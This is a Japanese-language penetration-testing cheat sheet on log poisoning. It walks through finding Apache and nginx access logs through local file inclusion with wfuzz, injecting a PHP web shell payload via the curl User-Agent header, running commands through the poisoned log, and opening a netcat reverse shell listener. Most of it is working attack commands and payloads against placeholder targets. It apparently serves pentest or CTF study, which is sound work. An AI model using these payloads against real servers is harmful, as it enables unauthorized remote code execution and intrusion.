# Log Poisoning Attack Flow

### 偵察フェーズ
    

[LFI_check_List.md](LFI_Check_List.md)

### ログファイルの発見
    
#### ログファイルの場所を特定：Webサーバーのアクセスログやプロセスのファイル記述子を探索する
    
    Apache (Debian/Ubuntu): /var/log/apache2/access.log
    Apache (RHEL/CentOS): /var/log/httpd/access_log
    wfuzz -c -z file,/usr/share/wordlists/LFI.txt [フィルターオプション] "http://TARGETIP/?PARAMETER=../../../../../../FUZZ"



LFIを使ってサーバーのログファイルを画面に表示する

#### よくあるターゲットパス
`http://TARGET/index.php?page=/var/log/apache2/access.log`

`http://TARGET/index.php?page=/var/log/httpd/access_log`

`http://TARGET/index.php?page=/var/log/nginx/access.log`




#### 自分のリクエストがログに記録され、それがブラウザに表示されるかを確認

`curl http://TARGET/Testing12345`

#### ログを再度読み込みLFIでログを表示し、Testing12345 という文字が含まれているか確認
ブラウザの検索機能（Ctrl+F）で見つける

#### PHPコードのサニタイズを確認

`curl http://TARGET -A "<?php phpinfo(); ?>"`



#### ポイズニング

`curl http://$IP -A "<?php system(\$_GET['cmd']); ?>"`

#### RCEの実行

LFIを介してポイズニングされたログファイルにアクセスし、cmdパラメータを通じてコマンドを渡す。

`http://TARGET/?PARAMETER=[LOG_PATH]&cmd=[リバースシェルコマンド]`

#### リバースシェル
    接続の確立：リバースシェルコマンドを送信し、ターゲットへのインタラクティブなアクセスを取得する。
    `nc -lvnp [ポート番号]`
